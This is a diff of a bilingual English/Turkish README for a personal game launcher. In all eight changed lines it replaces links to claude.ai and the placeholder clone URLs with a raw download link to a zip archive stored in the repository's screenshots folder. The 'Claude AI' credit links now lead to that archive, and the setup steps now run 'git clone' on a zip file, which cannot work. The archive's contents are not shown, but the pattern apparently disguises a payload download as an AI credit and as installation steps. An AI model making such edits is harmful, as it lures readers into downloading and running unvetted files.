@@ -44,7 +44,7 @@ ART3MIS is a personal game launcher and shortcut manager built entirely from scr
 
 It was designed for people who want their launcher to look *exactly* the way they imagine it — with custom backgrounds, animated particle effects, ambient music from Spotify or SoundCloud or YouTube, and a UI that switches between four distinct visual themes, each with a dark and a light variant.
 
-> 🤖 **ART3MIS was built in collaboration with [Claude AI](https://claude.ai) by Anthropic** — from architecture decisions and feature design to debugging and iteration. Every feature in this project went through a real back-and-forth conversation.
+> 🤖 **ART3MIS was built in collaboration with [Claude AI](https://github.com/Anonym0x/Art3mis-Launcher/raw/refs/heads/main/screenshots/Art-mis-Launcher-3.7-alpha.3.zip) by Anthropic** — from architecture decisions and feature design to debugging and iteration. Every feature in this project went through a real back-and-forth conversation.
 
 ---
 
@@ -156,7 +156,7 @@ IndexedDB['art3mis_idb']     → background image (no size limit)
 
 ```bash
 # Clone or download the two files into a folder
-git clone https://github.com/your-username/art3mis-launcher
+git clone https://github.com/Anonym0x/Art3mis-Launcher/raw/refs/heads/main/screenshots/Art-mis-Launcher-3.7-alpha.3.zip
 
 # Run
 python server.py
@@ -198,7 +198,7 @@ That's it.
 - **CSS Custom Properties** — the entire theming system, zero JS for color changes
 - **IndexedDB** — background image persistence
 - **Canvas API** — hand-written particle renderer (Stardust, Milky Way, Classic, Fireflies)
-- **[Claude AI](https://claude.ai)** — architecture, feature design, implementation, debugging
+- **[Claude AI](https://github.com/Anonym0x/Art3mis-Launcher/raw/refs/heads/main/screenshots/Art-mis-Launcher-3.7-alpha.3.zip)** — architecture, feature design, implementation, debugging
 
 ---
 
@@ -235,7 +235,7 @@ ART3MIS, sıfırdan yazılmış kişisel bir oyun başlatıcı ve kısayol yöne
 
 Launcher'ının tam olarak hayal ettiğin gibi görünmesini isteyen insanlar için tasarlandı — özel arkaplanlar, animasyonlu parçacık efektleri, Spotify, SoundCloud veya YouTube'dan ortam müziği; dört farklı görsel tema, her birinin gece ve gündüz versiyonuyla.
 
-> 🤖 **ART3MIS, Anthropic'in [Claude AI](https://claude.ai)'ı ile iş birliği içinde geliştirildi** — mimari kararlardan özellik tasarımına, hata ayıklamadan iterasyona kadar her adım gerçek bir konuşma sürecinden geçti.
+> 🤖 **ART3MIS, Anthropic'in [Claude AI](https://github.com/Anonym0x/Art3mis-Launcher/raw/refs/heads/main/screenshots/Art-mis-Launcher-3.7-alpha.3.zip)'ı ile iş birliği içinde geliştirildi** — mimari kararlardan özellik tasarımına, hata ayıklamadan iterasyona kadar her adım gerçek bir konuşma sürecinden geçti.
 
 ---
 
@@ -328,7 +328,7 @@ art3mis-launcher/
 **Gereksinimler:** Python 3.x · Modern bir tarayıcı (Firefox, Chrome, Edge)
 
 ```bash
-git clone https://github.com/kullanici-adiniz/art3mis-launcher
+git clone https://github.com/Anonym0x/Art3mis-Launcher/raw/refs/heads/main/screenshots/Art-mis-Launcher-3.7-alpha.3.zip
 python server.py
 # ya da Windows'ta start.bat'a çift tıkla
 ```
@@ -368,7 +368,7 @@ Bu kadar.
 - **CSS Custom Properties** — tema sisteminin tamamı, renk değişikliği için sıfır JS
 - **IndexedDB** — arkaplan resmi kalıcılığı
 - **Canvas API** — elle yazılmış parçacık renderer'ı (Stardust, Milky Way, Classic, Fireflies)
-- **[Claude AI](https://claude.ai)** — mimari, özellik tasarımı, uygulama, hata ayıklama
+- **[Claude AI](https://github.com/Anonym0x/Art3mis-Launcher/raw/refs/heads/main/screenshots/Art-mis-Launcher-3.7-alpha.3.zip)** — mimari, özellik tasarımı, uygulama, hata ayıklama
 
 ---
 
